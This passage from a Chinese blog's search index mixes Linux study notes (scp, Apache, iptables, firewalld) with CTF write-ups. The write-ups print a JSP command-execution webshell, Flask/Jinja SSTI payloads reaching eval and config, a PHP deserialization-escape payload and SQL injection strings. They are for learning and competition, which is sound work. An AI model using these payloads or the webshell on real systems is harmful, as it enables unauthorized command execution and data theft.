本地目录”。例如，可以把远程主机的系统版本信息文件下载过来，这样就无须先登录远程主机，再进行文件传送了，也就省去了很多周折。\nscp 192.168.40.3:&#x2F;etc&#x2F;redhat-release &#x2F;root\n或者在连上192.168.40.3的机器的情况下，在其shell里执行\nscp -r &#x2F;etc&#x2F;redhat-release root@192.168.40.2:&#x2F;root\n\n#前者在客户端shell中执行，而后者在服务端shell中执行\n\nApacheApache程序是目前拥有很高市场占有率的Web服务程序之一，其跨平台和安全性广泛被认可且拥有快速、可靠、简单的API扩展。它的名字取自美国印第安人的土著语，寓意着拥有高超的作战策略和无穷的耐性。Apache服务程序可以运行在Linux系统、UNIX系统甚至是Windows系统中，支持基于IP、域名及端口号的虚拟主机功能，支持多种认证方式，集成有代理服务器模块、安全Socket层（SSL），能够实时监视服务状态与定制日志消息，并有着各类丰富的模块支持。\n配置服务文件参数需要提醒大家的是，前文介绍的httpd服务程序的安装和运行，仅仅是httpd服务程序的一些皮毛，我们依然有很长的道路要走。在Linux系统中配置服务，其实就是修改服务的配置文件，因此，还需要知道这些配置文件的所在位置以及用途，httpd服务程序的主要配置文件及存放位置              Linux系统中的配置文件\n\n\n\n服务目录\n/etc/httpd\n\n\n\n主配置文件\n/etc/httpd/conf/httpd.conf\n\n\n网站数据目录\n/var/www/html\n\n\n访问日志\n/var/log/httpd/access_log\n\n\n错误日志\n/var/log/httpd/error_log\n\n\nhttpd服务的主配置文件中，存在三种类型的信息：注释行信息、全局配置、区域配置。\n\n 配置httpd服务程序时最常用的参数以及用途描述\n\n\n\nServerRoot\n服务目录\n\n\n\nServerAdmin\n管理员邮箱\n\n\nUser\n运行服务的用户\n\n\nGroup\n运行服务的用户组\n\n\nServerName\n网站服务器的域名\n\n\nDocumentRoot\n网站数据目录\n\n\nListen\n监听的IP地址与端口号\n\n\nDirectoryIndex\n默认的索引页页面\n\n\nErrorLog\n错误日志文件\n\n\nCustomLog\n访问日志文件\n\n\nTimeout\n网页超时时间，默认为300秒\n\n\n对于这里的修改，主要是修改主配置文件，可以根据需要来决定是全局配置还是区域配置，然后就是使用vim的话记得保存配置，然后重启httpd服务，因为一般来说各种配置文件修改后都不会实时生效，而是需要重启服务，如果遇到配置不生效，多半是因为服务没有重启。接下来如果你没有使用默认的httpd服务数据根目录，也就是/var/www//html,有可能你在重启服务后，你的目标网站访问结果，并不是预计界面而是初始默认界面，如果你的配置没有错误，那么问题多半是出来了SELinux，你需要做的就是为相应的目录和文件添加SELinux安全上下文，从而符合SELinux的要求，否则就会被其拦截，从而导致拦截异常。\n虚拟主机功能把不同的子域名绑定到不同的端口上。\n[root@linuxprobe ~]# vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf\n113 &lt;VirtualHost 192.168.10.10:6111&gt;\n114 DocumentRoot &quot;&#x2F;home&#x2F;wwwroot&#x2F;6111&quot;\n115 ServerName www.linuxprobe.com\n116 &lt;Directory &quot;&#x2F;home&#x2F;wwwroot&#x2F;6111&quot;&gt;\n117 AllowOverride None\n118 Require all granted\n119 &lt;&#x2F;Directory&gt; \n120 &lt;&#x2F;VirtualHost&gt;\n121 &lt;VirtualHost 192.168.10.10:6222&gt;\n122 DocumentRoot &quot;&#x2F;home&#x2F;wwwroot&#x2F;6222&quot;\n123 ServerName bbs.linuxprobe.com\n124 &lt;Directory &quot;&#x2F;home&#x2F;wwwroot&#x2F;6222&quot;&gt;\n125 AllowOverride None\n126 Require all granted\n127 &lt;&#x2F;Directory&gt;\n128 &lt;&#x2F;VirtualHost&gt;\n\n同IP多域名，不同的web目录\n[root@linuxprobe ~]# vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf\n113 &lt;VirtualHost 192.168.10.10&gt;\n114 DocumentRoot &quot;&#x2F;home&#x2F;wwwroot&#x2F;www&quot;\n115 ServerName &quot;www.linuxprobe.com&quot;\n116 &lt;Directory &quot;&#x2F;home&#x2F;wwwroot&#x2F;www&quot;&gt;\n117 AllowOverride None\n118 Require all granted\n119 &lt;&#x2F;directory&gt; \n120 &lt;&#x2F;VirtualHost&gt;\n121 &lt;VirtualHost 192.168.10.10&gt;\n122 DocumentRoot &quot;&#x2F;home&#x2F;wwwroot&#x2F;bbs&quot;\n123 ServerName &quot;bbs.linuxprobe.com&quot;\n124 &lt;Directory &quot;&#x2F;home&#x2F;wwwroot&#x2F;bbs&quot;&gt;\n125 AllowOverride None\n126 Require all granted\n127 &lt;&#x2F;Directory&gt;\n128 &lt;&#x2F;VirtualHost&gt;\n129 &lt;VirtualHost 192.168.10.10&gt;\n130 DocumentRoot &quot;&#x2F;home&#x2F;wwwroot&#x2F;tech&quot;\n131 ServerName &quot;tech.linuxprobe.com&quot;\n132 &lt;Directory &quot;&#x2F;home&#x2F;wwwroot&#x2F;tech&quot;&gt;\n133 AllowOverride None\n134 Require all granted\n135 &lt;&#x2F;directory&gt;\n136 &lt;&#x2F;VirtualHost&gt;\n\n这里的配置完成后也是一样要看看SELinux配置时候完成，当然有的系统是没有SELinux的或者被关闭，但是要说安全的话服务器上有SELinux还是更加安全的，但是我目前本机的UOS个人版是没有自带SELinux的。\n参考文件《Linux就该这么学》\n","slug":"Redhat学习-六","date":"2020-12-26T14:17:49.000Z","categories_index":"Linux学习","tags_index":"Linux","author_index":"A1andNS"},{"id":"debcb1ad3dee8b8ef571d1cc227ee9b4","title":"XCTF全国高校主题挑战赛华为云专场","content":"webshell_1考点：webshell\n在首页上传一个jsp木马\njsp内容为\n&lt;%if(“a1andns”.equals(request.getParameter(“pwd”))){         java.io.InputStreamin=Runtime.getRuntime().exec(request.getParameter(“i”)).getInputStream();int a =-1;byte[] b =newbyte[2048];out.print(“\");while((a=in.read(b))!=-1){out.println(newString(b));}out.print(\"“);} %&gt;\n得到webshell位置为http://124.70.199.122:31203/upload/1ca84461-1291-4075-8e67-516f556b862e.jsp\npayload:\nhttp:&#x2F;&#x2F;124.70.199.122:31203&#x2F;upload&#x2F;1ca84461-1291-4075-8e67-516f556b862e.jsp?pwd&#x3D;a1andns&amp;i&#x3D;cat &#x2F;flag\n\nMINE1_1考点：SSTI\n利用点应该在http://124.70.204.134:31079/success?msg=&#123;&#123;&#125;&#125;,flask框架，但是有过滤，’’和_、[]、args、%都被过滤了，使用values接收GET数据，从而实现绕过。\n查看子类：\n&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__ \n\n最终payload：\nhttp:&#x2F;&#x2F;121.37.165.126:32568&#x2F;success?msg&#x3D;&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4)(233)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8)(request.values.x9)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;open(&quot;&#x2F;app&#x2F;flag.txt&quot;).read()\n\n这里主要是利用request的values来接收GET传入的数据，从而达到绕过过滤的目的。\n","slug":"XCTF全国高校主题挑战赛华为云专场","date":"2020-12-25T13:11:39.000Z","categories_index":"CTF","tags_index":"XCTF","author_index":"A1andNS"},{"id":"c993bcceaa8ff4a9e60b7e8c86bd0c0e","title":"Redhat学习(五)","content":"来看看redhat的防火墙管理工具，基本的Linux都会使用的防火墙。这里Redhat 7 中新增了firewalld防火墙，之前版本中都是iptables，现在很多Linux也开始使用firewalld了。\n防火墙管理工具所谓防火墙，就是用来隔绝内网和外网的，部署在内网和公网之间来充当保护屏障的工具，不论是硬件防火墙或者软件防火墙，主要功能都是差不多的，主要就是依据策略对穿越防火墙的流量来进行过滤。防火墙策略可以基于流量的源地址和目的地址、端口号、协议、应用等信息来制定。然后防火墙就会按照我们设置的策略去监控出入流量，如果流量特征符合我们设置的过滤策略，就会执行相应处理，以此来判断放行什么流量，过滤哪些流量。\n从真正意义上来说其实iptables和firewalld都不算真正的防火墙，它们只是用来定义防火墙策略的防火墙管理工具，它们就是一种服务。其中iptables服务会把配置好的防火墙策略交给内核层的netfilter网络过滤器来处理，而firewalld服务则是把配置好的防火墙策略交给内核层的nftables包过滤框架来处理。其实Redhat 7系统并不是只有一个firewalld，只是默认的改为这个，netfilter他也还是存在的，实际上Linux上有好几个防火墙管理工具，平时用一个也就好了。\niptables虽然firewalld推出也很久了，但是iiptbales还是比较流行，被广泛使用，毕竟大量运维人员习惯了iptables的使用，\n策略与规则链防火墙回从上到下的顺序来读取配置的策略规则，在找到匹配项后就立即结束匹配工作，然后去执行匹配项目中定义的行为。如果所有策略中都没有匹配的就去执行默认策略。一般防火墙策略规则的设置有两种：一种是放行，一种是阻止。默认策略值得关注根据实际需求来判断是使用默认拒绝还是默认允许。\n规则就是处理或过滤流量的策略条目，多条规则就构成了一个规则链，而规则链依据数据包处理位置的不同又可以分成几类。\n\n在进行路由选择前处理数据包（PREROUTING）\n处理流入的数据包（INPUT）\n处理流出的数据包（OUTPUT）\n处理转发的数据包（FORWARD）\n在进行路由选择后处理数据包（POSTROUTING）\n\n一般我们配置INPUT比较多。\niptables的策略中的术语有ACCEPT、REJECT、LOG、DROP，其中REJECT是拒绝流量并且回复消息告知发送者信息被丢弃，而DROP则是不回复的拒绝流量。最明显的就是，如果是rejuect的，在ping命令中会看到一个端口不可达的提示，而DROP的则是显示响应超时，所以这就让人无法判断他是主机不在线还是流量被拒绝。\n\n\n\n参数\n作用\n\n\n\n-P\n设置默认策略\n\n\n-F\n清空规则链\n\n\n-L\n查看规则链\n\n\n-A\n在规则链的末尾加入新规则\n\n\n-I num\n在规则链的头部加入新规则\n\n\n-D num\n删除某一条规则\n\n\n-s\n匹配来源地址IP/MASK，加叹号“!”表示除这个IP外\n\n\n-d\n匹配目标地址\n\n\n-i 网卡名称\n匹配从这块网卡流入的数据\n\n\n-o 网卡名称\n匹配从这块网卡流出的数据\n\n\n-p\n匹配协议，如TCP、UDP、ICMP\n\n\n–dport num\n匹配目标端口号\n\n\n–sport num\n匹配来源端口号\n\n\n上手试一试：\n#查看已有的防火墙规则链\n[root@localhost a1andns]# iptables -L\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nACCEPT     udp  --  anywhere             anywhere             udp dpt:domain\nACCEPT     tcp  --  anywhere             anywhere             tcp dpt:domain\nACCEPT     udp  --  anywhere             anywhere             udp dpt:bootps\nACCEPT     tcp  --  anywhere             anywhere             tcp dpt:bootps\n                      ............\n#清空已有的防火墙规则链\n[root@localhost a1andns]# iptables -F\n[root@localhost a1andns]# iptables -L\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain FORWARD (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain FORWARD_IN_ZONES (0 references)\ntarget     prot opt source               destination                   ..................\n#设置INPUT的默认策略是DROP\n[root@localhost a1andns]# iptables -P INPUT DROP\n[root@localhost a1andns]# iptables -L\nChain INPUT (policy DROP)\ntarget     prot opt source               destination         \n\nChain FORWARD (policy ACCEPT)\ntarget     prot opt source               destination     \n#注意：默认链的拒绝只能使用DROP，不能使用REJECT，注意如果我们吧默认设置为拒绝，那我们就需要添加一些策略来匹配合法流量，让其可以通过，都这所有流量都被干掉了。\n#向INPUT链中添加允许ICMP流量进入的策略\n[root@localhost a1andns]# iptables -I INPUT -p ICMP -j ACCEPT\n[root@localhost a1andns]# iptables -L\nChain INPUT (policy DROP)\ntarget     prot opt source               destination         \nACCEPT     icmp --  anywhere             anywhere     \n[root@localhost a1andns]# ping -c 4 192.168.184.128\nPING 192.168.184.128 (192.168.184.128) 56(84) bytes of data.\n64 bytes from 192.168.184.128: icmp_seq=1 ttl=64 time=0.040 ms\n64 bytes from 192.168.184.128: icmp_seq=2 ttl=64 time=0.059 ms\n64 bytes from 192.168.184.128: icmp_seq=3 ttl=64 time=0.036 ms\n64 bytes from 192.168.184.128: icmp_seq=4 ttl=64 time=0.060 ms\n\n--- 192.168.184.128 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3000ms\nrtt min/avg/max/mdev = 0.036/0.048/0.060/0.013 ms\n#删除上面的规则，并且把默认修改为ACCEPT\n[root@localhost a1andns]# iptables -D INPUT 1\n[root@localhost a1andns]# iptables -P INPUT ACCEPT\n[root@localhost a1andns]# iptables -L\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination   \n#将INPUT规则链设置为只允许指定网段的主机访问本机的22端口，拒绝来自其他所有主机的流量\n[root@localhost a1andns]# iptables -I INPUT -s 192.168.184.0/24 -p tcp --dport 22 -j ACCEPT\n[root@localhost a1andns]# iptables -A INPUT -p tcp --dport 22 -j REJECT\n[root@localhost a1andns]# iptables -L\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nACCEPT     tcp  --  192.168.184.0/24     anywhere             tcp dpt:ssh\nREJECT     tcp  --  anywhere             anywhere             tcp dpt:ssh reject-with icmp-port-unreachable\n#向INPUT规则链中添加拒绝所有人访问本机12345端口的策略规则\n[root@localhost a1andns]# iptables -I INPUT -p tcp --dport 12345 -j REJECT\n[root@localhost a1andns]# iptables -I INPUT -p udp --dport 12345 -j REJECT\n[root@localhost a1andns]# iptables -L\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nREJECT     udp  --  anywhere             anywhere             udp dpt:italk reject-with icmp-port-unreachable\nREJECT     tcp  --  anywhere             anywhere             tcp dpt:italk reject-with icmp-port-unreachable\nACCEPT     tcp  --  192.168.184.0/24     anywhere             tcp dpt:ssh\nREJECT     tcp  --  anywhere             anywhere             tcp dpt:ssh reject-with icmp-port-unreachable\n#向INPUT规则链中添加拒绝192.168.10.5主机访问本机80端口（web服务）的策略\n[root@localhost a1andns]# iptables -I INPUT -p tcp -s 192.168.10.5 --dport 80 -j REJECT\n[root@localhost a1andns]# iptables -L\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nREJECT     tcp  --  192.168.10.5         anywhere             tcp dpt:http reject-with icmp-port-unreachable\nREJECT     udp  --  anywhere             anywhere             udp dpt:italk reject-with icmp-port-unreachable\nREJECT     tcp  --  anywhere             anywhere             tcp dpt:italk reject-with icmp-port-unreachable\nACCEPT     tcp  --  192.168.184.0/24     anywhere             tcp dpt:ssh\nREJECT     tcp  --  anywhere             anywhere             tcp dpt:ssh reject-with icmp-port-unreachable\n\n#向INPUT规则链中添加拒绝所有主机访问本机1000-1024端口的策略\n[root@localhost a1andns]# iptables -A INPUT -p tcp --dport 1000:1024 -j REJECT\n[root@localhost a1andns]# iptables -A INPUT -p udp --dport 1000:1024 -j REJECT\n[root@localhost a1andns]# iptables -L\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nREJECT     tcp  --  192.168.10.5         anywhere             tcp dpt:http reject-with icmp-port-unreachable\nREJECT     udp  --  anywhere             anywhere             udp dpt:italk reject-with icmp-port-unreachable\nREJECT     tcp  --  anywhere             anywhere             tcp dpt:italk reject-with icmp-port-unreachable\nACCEPT     tcp  --  192.168.184.0/24     anywhere             tcp dpt:ssh\nREJECT     tcp  --  anywhere             anywhere             tcp dpt:ssh reject-with icmp-port-unreachable\nREJECT     tcp  --  anywhere             anywhere             tcp dpts:cadlock2:1024 reject-with icmp-port-unreachable\nREJECT     udp  --  anywhere             anywhere             udp dpts:cadlock2:1024 reject-with icmp-port-unreachable\n\n需要注意的是iptables服务在重启后会失效，如果想让配置永久有效，需要执行保存命令\nservice iptables save\n\nfirewalldfirewalld现在是RHEL7的默认防火墙配置管理工具，它具有cli和基于GUI的两种管理方式，相较于传统的防火墙管理工具，firewalld支持动态更新技术并且加入了区域的概念，所谓的区域就是firewalld事先准备了几套防火墙策略模板，以便于用户可以根据自己所处不同的环境来选择合适的策略。从而事先策略快切换。\n区域以及其默认策略表：\n\n\n\n区域\n默认规则策略\n\n\n\ntrusted\n允许所有的数据包\n\n\nhome\n拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、mdns、ipp-client、amba-client与dhcpv6-client服务相关，则允许流量\n\n\ninternal\n等同于home区域\n\n\nwork\n拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、ipp-client与dhcpv6-client服务相关，则允许流量\n\n\npublic\n拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、dhcpv6-client服务相关，则允许流量\n\n\nexternal\n拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量\n\n\ndmz\n拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量\n\n\nblock\n拒绝流入的流量，除非与流出的流量相关\n\n\ndrop\n拒绝流入的流量，除非与流出的流量相关\n\n\nCLI方式CLI也就是命令行方式，Linux的常用方式。firewall-cmd有很多名利参数可以使用，但是这里有一点就是，只有长格式没有短格式。好在可以tab不全参数。\n\n\n\n参数\n作用\n\n\n\n–get-default-zone\n查询默认的区域名称\n\n\n–set-default-zone=&lt;区域名称&gt;\n设置默认的区域，使其永久生效\n\n\n–get-zones\n显示可用的区域\n\n\n–get-services\n显示预先定义的服务\n\n\n–get-active-zones\n显示当前正在使用的区域与网卡名称\n\n\n–add-source=\n将源自此IP或子网的流量导向指定的区域\n\n\n–remove-source=\n不再将源自此IP或子网的流量导向某个指定区域\n\n\n–add-interface=&lt;网卡名称&gt;\n将源自该网卡的所有流量都导向某个指定区域\n\n\n–change-interface=&lt;网卡名称&gt;\n将某个网卡与区域进行关联\n\n\n–list-all\n显示当前区域的网卡配置参数、资源、端口以及服务等信息\n\n\n–list-all-zones\n显示所有区域的网卡配置参数、资源、端口以及服务等信息\n\n\n–add-service=&lt;服务名&gt;\n设置默认区域允许该服务的流量\n\n\n–add-port=&lt;端口号/协议&gt;\n设置默认区域允许该端口的流量\n\n\n–remove-service=&lt;服务名&gt;\n设置默认区域不再允许该服务的流量\n\n\n–remove-port=&lt;端口号/协议&gt;\n设置默认区域不再允许该端口的流量\n\n\n–reload\n让“永久生效”的配置规则立即生效，并覆盖当前的配置规则\n\n\n–panic-on\n开启应急状况模式\n\n\n–panic-off\n关闭应急状况模式\n\n\nfirewalld和前面说到的iptables一样，配置的防火墙策略会在重启系统是失效，所以如果要让配置一直有效就需要添加–permanent参数。但是这个永久模式又有点问题，它只有在重启后才会让配置生效，所以经常需要我们手动去重新加载配置，firewll-cmd --reload命令来进行重新加载配置。\n#查看firewalld服务当前所使用的区域\n[root@localhost a1andns]# firewall-cmd --get-default-zone \npublic\n#查询ens33网卡在firewall服务种区域\n[root@localhost a1andns]# firewall-cmd --get-zone-of-interface==ens33\nno zone\n#把firewalld服务中ens33网卡的默认区域修改为external，并且在系统重启后生效。分别查看当前与永久模式下的区域名称\n[root@localhost a1andns]# firewall-cmd --permanent --zone=external --change-interface=ens33\nsuccess\n[root@localhost a1andns]# firewall-cmd --get-zone-of-interface=ens33\nno zone\n[root@localhost a1andns]# firewall-cmd --permanent --get-zone-of-interface=ens33\nexternal\n#把firewall服务的当前默认区域设置为public\n[root@localhost a1andns]# firewall-cmd --set-default-zone=public\nsuccess\n[root@localhost a1andns]# firewall-cmd --get-default-zone \npublic\n#启动或关闭firewall防火墙服务的应急状况模式，阻断一切网络连接\n[root@localhost a1andns]# firewall-cmd --panic-on\nsuccess\n[root@localhost a1andns]# firewall-cmd --panic-off\nsuccess\n#查询public区域是否允许请求SSH和HTTPS协议的流量\n[root@localhost a1andns]# firewall-cmd --zone=public --query-service=ssh\nyes\n[root@localhost a1andns]# firewall-cmd --zone=public --query-service=https\nno\n#把firewall服务中的请求HTTPS协议的流量设置为永久允许，并且立即生效\n[root@localhost a1andns]# firewall-cmd --zone=public --add-service=https\nsuccess\n[root@localhost a1andns]# firewall-cmd --permanent --zone=public --add-service=https\nsuccess\n[root@localhost a1andns]# firewall-cmd --reload\nsuccess\n#把firewall服务中请求HTTP协议的流量设置为永久拒绝，并且立即生效\n[root@localhost a1andns]# firewall-cmd --zone=public --remove-service=https\nsuccess\n[root@localhost a1andns]# firewall-cmd --permanent --zone=public --remove-service=https\nsuccess\n[root@localhost a1andns]# firewall-cmd --reload\nsuccess\n#把firewall服务中访问8080和8081端口的流量策略设置为i允许，仅限当前生效\n[root@localhost a1andns]# firewall-cmd --zone=public --add-port=8080-8081/tcp\nsuccess\n[root@localhost a1andns]# firewall-cmd --zone=public --list-all \npublic\n  target: default\n  icmp-block-inversion: no\n  interfaces: \n  sources: \n  services: dhcpv6-client ssh\n  ports: 8080-8081/tcp\n  protocols: \n  masquerade: no\n  forward-ports: \n  source-ports: \n  icmp-blocks: \n  rich rules: \n#把999端口的流量转发得到22端口，并且要求当前和长期均有效\n[root@localhost a1andns]# firewall-cmd --permanent --zone=public --add-forward-port=port=999:proto=tcp:toport=22:toaddr=192.168.10.10\nsuccess\n[root@localhost a1andns]# firewall-cmd --reload\nsuccess\n\n\nGUI管理工具\n图形化操作就省下来很多很长的、复杂的命令。中文化的GUI操作起来还是很简单的。\nTCP WrappersTCP Wrapper是一款流量监控程序，它服务的防火墙策略由两个控制列表文件所控制，用户可以编辑允许控制列表文件来放行流量。两个文件分别是：/etc/hosts.allow,/etc/hosts.deny\n\n\n\n客户端类型\n示例\n满足示例的客户端列表\n\n\n\n单一主机\n192.168.10.10\nIP地址为192.168.10.10的主机\n\n\n指定网段\n192.168.10.\nIP段为192.168.10.0/24的主机\n\n\n指定网段\n192.168.10.0/255.255.255.0\nIP段为192.168.10.0/24的主机\n\n\n指定DNS后缀\n.linuxprobe.com\n所有DNS后缀为.linuxprobe.com的主机\n\n\n指定主机名称\nwww.linuxprobe.com\n主机名称为www.linuxprobe.com的主机\n\n\n指定所有客户端\nALL\n所有主机全部包括在内\n\n\n参考来源《Linux就该这么学》\n","slug":"Redhat学习-五","date":"2020-12-15T08:12:52.000Z","categories_index":"Linux学习","tags_index":"Linux,Redhat","author_index":"A1andNS"},{"id":"c9ff35e68b84eedc69746ce24f3be94d","title":"BUUOJ刷题记录2020-12-14-21","content":"[WesternCTF2018]shrine考点 ：代码审计、ssti\nimport flask\nimport os\n\napp = flask.Flask(__name__)\napp.config['FLAG'] = os.environ.pop('FLAG')\n@ app.route('/')\ndef index():\n    return open(__file__).read()\n@ app.route('/shrine/')\ndef shrine(shrine):\n    def safe_jinja(s):\n        s = s.replace('(', '').replace(')', '')\n        blacklist = ['config', 'self']\n        return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s\n    return flask.render_template_string(safe_jinja(shrine))\n\nif __name__ == '__main__':\n    app.run(debug = True)\n\n审计代码可以看到\napp.config['FLAG'] = os.environ.pop('FLAG')\n\n这里是设置了一个名叫FLAG的config项，这应该就是我们要的flag，我们目的就是读取这个flag。\n接着往下看，/路由直接给出源代码，/shrine/路由会过滤左右括号，以及有一个黑名单，config和self都在其中，所以直接是不行了。所以看看有哪些内置变量函数，这里的url_for和get_flashed_messages都可以使用\npayload：\n&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;\n或\n&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;\n\n[安洵杯 2019]easy_serialize_php考点：代码审计,PHP反序列化逃逸\n&lt;?php\n\n$function = @$_GET['f'];\n\nfunction filter($img)&#123;\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n&#125;\n\n\nif($_SESSION)&#123;\n    unset($_SESSION);\n&#125;\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\nextract($_POST);\n\nif(!$function)&#123;\n    echo '&lt;a href=\"index.php?f=highlight_file\">source_code&lt;/a>';\n&#125;\n\nif(!$_GET['img_path'])&#123;\n    $_SESSION['img'] = base64_encode('guest_img.png');\n&#125;else&#123;\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n&#125;\n\n$serialize_info = filter(serialize($_SESSION));\n\nif($function == 'highlight_file')&#123;\n    highlight_file('index.php');\n&#125;else if($function == 'phpinfo')&#123;\n    eval('phpinfo();'); //maybe you can find something in here!\n&#125;else if($function == 'show_image')&#123;\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n\n看源码，按他的提示去看一下phpinfo，发现了一个文件 d0g3_f1ag.php。先来看看上面代码中的交互点：第一个是get类型的f参数，一个是GET类型的img_path参数。\n然后我们看看这里有一个session的序列化和反系列化。\n$serialize_info = filter(serialize($_SESSION));\n#对SESSION变量做序列化，然后在过滤一些内容\n\nif($function == 'highlight_file')&#123;\n    highlight_file('index.php');\n&#125;else if($function == 'phpinfo')&#123;\n    eval('phpinfo();'); //maybe you can find something in here!\n&#125;else if($function == 'show_image')&#123;\n    #当参数f传入的是show_image的时候就会执行反系列化\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n    #然后去读文件\n&#125;\n\n之前做过替换后字母数量增加的，那题是把值闭合，让自己的攻击语句逃逸。这里我们要想办法把一些字符吃了才行，让我们构造的内容被反系列化。这里有一个extract($_POST);是一个利用点，我们可以通过传入post参数的session数组来传递payload。\ns:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;是我们期望的img项的内容\na:2:&#123;s:7:&quot;&quot;;s:50:&quot;;s:3:&quot;xxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125;\n\npayload：\n_SESSION[flagphp]&#x3D;;s:3:&quot;xxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;\n\n\n&lt;!--?php\n\n$flag = 'flag in /d0g3_fllllllag';\n\n?-->\n\n在网页源代码中看到提示\npayload:\n_SESSION[flagphp]&#x3D;;s:3:&quot;xxx&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;\n\n\n总结：类似这样的序列化后过滤字符并且字符长度变短了的情况，可以考虑用被过滤字符构造一个键值对的键，以此来吞并键值对中值部分的序列化值，再构造一个与之配对的值，就可以实现我们的字符串的逃逸，并且挤掉不想要的原有值。\n而替换后字符个数变多的，则是通过把被过滤字符放在值的位置上，让字符增加挤占原来值的位置，让身为原来值的我们的payload被挤出来，从而构成攻击。\n","slug":"BUUOJ刷题记录2020-12-14-21","date":"2020-12-14T08:21:58.000Z","categories_index":"CTF","tags_index":"BUUOJ","author_index":"A1andNS"},{"id":"534e07e0322b2e8867b8c55d490051f3","title":"BUU刷题20201207-20201214","content":"[BJDCTF2020]Cookie is so stable考点：twig模板注入\nhint.php文件里提示看看cookies,再cookie里的user处发现了一个ssti点，这里是PHP环境，所以就是PHP的ssti。这里通过测试是twig模板注入\npayload:\n\n得到flag\ntwig是一款使用与PHP的现代模板引擎，官网https://twig.symfony.com/，根据官网的介绍，Twig有比较简洁的语法。具有面向模板的语法：\n\n\n[SWPU2019]Web1考点：二次注入\n这题再广告发布页面存在二次注入漏洞，这个我一开始没有发现，值得注意，在类似留言版的位置也是可能存在一个二次注入点的可能的。空格和information_schema被过滤了，order by也用不了。\n首先使用union select来做列数的确定，一个一个试，发现有22列。然后读取处数据库名为web1\n获取表名：\n-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22\n\n这里可以使用innodb_table_stats来代替information_schema，然后得到查询结果\nFLAG_TABLE,news,users,gtid_slave_pos,ads,users\n\n关注users，因为知道管理员账户admin是存在的，所以看看users\n-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22\n\n得到了查询结果：\n2,flag,admin,123\n\n这是第二列的结果，下面看看表的第三列是什么\n-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22\n\n得到flag\n[Misc]大白修改图片长宽，获取flag。\n\n[Misc]你竟然赶我走winhex查看末尾：flag{stego_is_s0_bor1ing}\n","slug":"BUU刷题20201207-20201214","date":"2020-12-08T10:57:03.000Z","categories_index":"CTF","tags_index":"BUUOJ,BJDCTF,SWPU2019","author_index":"A1andNS"},{"id":"8a47ad09cc35b02d6729e585b457dd31","title":"SWPUCTF杂项","content":"考前的死亡浪